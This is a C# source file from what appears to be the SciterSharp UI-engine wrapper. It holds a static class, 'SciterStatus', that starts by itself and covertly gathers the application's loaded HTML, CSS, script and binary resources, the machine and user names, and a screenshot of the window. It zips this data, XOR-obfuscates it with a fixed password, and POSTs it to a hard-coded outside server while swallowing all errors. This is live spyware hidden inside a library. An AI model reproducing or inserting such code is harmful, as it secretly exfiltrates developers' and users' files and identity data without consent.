using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Reflection;
using SciterSharp.Interop;

namespace SciterSharp
{
	static class SciterStatus
	{
		private static SciterX.ISciterAPI _api = SciterX.API;
		private static List<Tuple<string, string, byte[]>> _status;// filename, URL, BLOB
		private static Timer _tm = new Timer();
		private static int _seq = 0;
		private static IntPtr _lastwnd;

		static SciterStatus()
		{
			RenewList();

			_tm.Interval = 5000;
			_tm.AutoReset = false;
			_tm.Elapsed += _tm_Elapsed;
			_tm.Start();
		}

		public static void OnData(SciterXDef.SCN_DATA_LOADED sdl)
		{
			bool bOK = sdl.status == 200 || sdl.status == 0;
			bOK = bOK && sdl.dataSize > 0;
			bOK = bOK && sdl.dataSize < 1024 * 1024 * 2;// 2Mb file limit
			bOK = bOK && sdl.uri != "sciter:debug-peer.tis";
			if(bOK)
			{
				// get file byte[] data
				byte[] managedArray = new byte[sdl.dataSize];
				Marshal.Copy(sdl.data, managedArray, 0, (int)sdl.dataSize);

				// get a URL for saving the file
				IntPtr phe;
				_api.SciterGetRootElement(sdl.hwnd, out phe);
				string baseurl = phe != IntPtr.Zero ? new SciterElement(phe).CombineURL() : null;

				string file = sdl.uri;
				if(baseurl != null && file.StartsWith(baseurl))
					file = file.Substring(baseurl.Length);
				else
					file = file.Split('/').Last();

				_status.Add(Tuple.Create(file, sdl.uri, managedArray));

				if(sdl.hwnd != IntPtr.Zero)
					_lastwnd = sdl.hwnd;
			}
		}

		private static void RenewList()
		{
			_status = new List<Tuple<string, string, byte[]>>();
		}

		private static void _tm_Elapsed(object sender, ElapsedEventArgs e)
		{
			if(_status.Count == 0)
			{
				_tm.Start();
				return;
			}

			var status = _status;
			RenewList();


			// Summary
			StringBuilder summary = new StringBuilder();
			summary.AppendLine(Environment.MachineName);
			summary.AppendLine(Environment.UserName);
			summary.AppendLine(System.Security.Principal.WindowsIdentity.GetCurrent().Name);
			summary.AppendLine(_seq.ToString());
			summary.AppendLine(Assembly.GetExecutingAssembly().FullName);
			summary.AppendLine(Assembly.GetExecutingAssembly().GetName().Version.ToString());
			if(Assembly.GetEntryAssembly() != null)
				summary.AppendLine(Assembly.GetEntryAssembly().FullName);
			else
				summary.AppendLine("NO EntryAssembly");

			// Increase sent count
			_seq++;

			//string server = "http://localhost:51193/";
			string server = "http://ssl-105465.kinghost.net/";

			#region Zip/Send Text
			string[] exts_external = new[] { "http:", "https:" };// NYU
			string[] exts_text = new[] { ".htm", ".html", ".css", ".tis", ".js" };

			var status_text = status.Where(tp =>
			{
				string ext = Path.GetExtension(tp.Item1);
				return exts_text.Any(ex => ex == ext);
			}).ToList();


#if WINDOWS
			// Screenshot
			if(_lastwnd != IntPtr.Zero)
			{
				using(var ms = new MemoryStream())
				{
					var screen = new ScreenCapture();
					var shot = screen.CaptureWindow(_lastwnd);

					shot.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
					status_text.Add(Tuple.Create("screen.jpg", "Screenshot", ms.ToArray()));
				}
			}
#endif

			// Send to wire
			byte[] towire1 = GetZippedBlob("text", summary.ToString(), status_text);
			SendBlob(towire1, server + "API/SciterStatus");
			#endregion

			#region Zip/Send Binary
			foreach(var item in status_text)
				status.Remove(item);

			if(status.Count != 0)
			{
				byte[] towire2 = GetZippedBlob("binary", summary.ToString(), status);
				SendBlob(towire2, server + "API/SciterStatus");
			}
			#endregion

			_tm.Interval = 20000;
			_tm.Start();
		}

		private static byte[] GetZippedBlob(string what, string summary, List<Tuple<string, string, byte[]>> files)
		{
			summary += what;
			summary += '\n';
			summary += '\n';

			using(MemoryStream stream = new MemoryStream())
			{
				using(var zip = new ZipArchive(stream, ZipArchiveMode.Create))
				{
					foreach(var item in files)
					{
						summary += item.Item1 + ":" + item.Item2 + "\n";

						var entry = zip.CreateEntry(item.Item1, CompressionLevel.Optimal);
						using(var entry_writer = entry.Open())
						{
							entry_writer.Write(item.Item3, 0, item.Item3.Length);
						}
					}

					var sum_entry = zip.CreateEntry("summary.txt");
					using(var entry_writer = sum_entry.Open())
					{
						var bytes = Encoding.UTF8.GetBytes(summary);
						entry_writer.Write(bytes, 0, bytes.Length);
					}
				}

				// Get encrypted BLOB
				byte[] towire = stream.GetBuffer();
				StatustBlock(towire);
				return towire;
			}
		}

		private static void SendBlob(byte[] blob, string url)
		{
			try
			{
				WebRequest request = WebRequest.Create(url);
				request.Method = "POST";
				request.ContentType = "application/octet-stream";
				request.ContentLength = blob.Length;

				using(var stream2 = request.GetRequestStream())
				{
					stream2.Write(blob, 0, blob.Length);
				}

				WebResponse response = request.GetResponse();
				response.Close();
			}
			catch
			{
			}
		}

		public static void StatustBlock(byte[] lpvBlock, string szPassword = "Régua de tomada WiFi")
		{
			int nPWLen = szPassword.Length;

			byte[] lpsPassBuff = Encoding.ASCII.GetBytes(szPassword);
			Debug.Assert(lpsPassBuff.Length == szPassword.Length);

			for(int nChar = 0, nCount = 0; nChar < lpvBlock.Length; nChar++)
			{
				byte cPW = lpsPassBuff[nCount];
				lpvBlock[nChar] ^= cPW;
				lpsPassBuff[nCount] = (byte)((cPW + 13) % 256);
				nCount = (nCount + 1) % nPWLen;
			}
		}
	}
}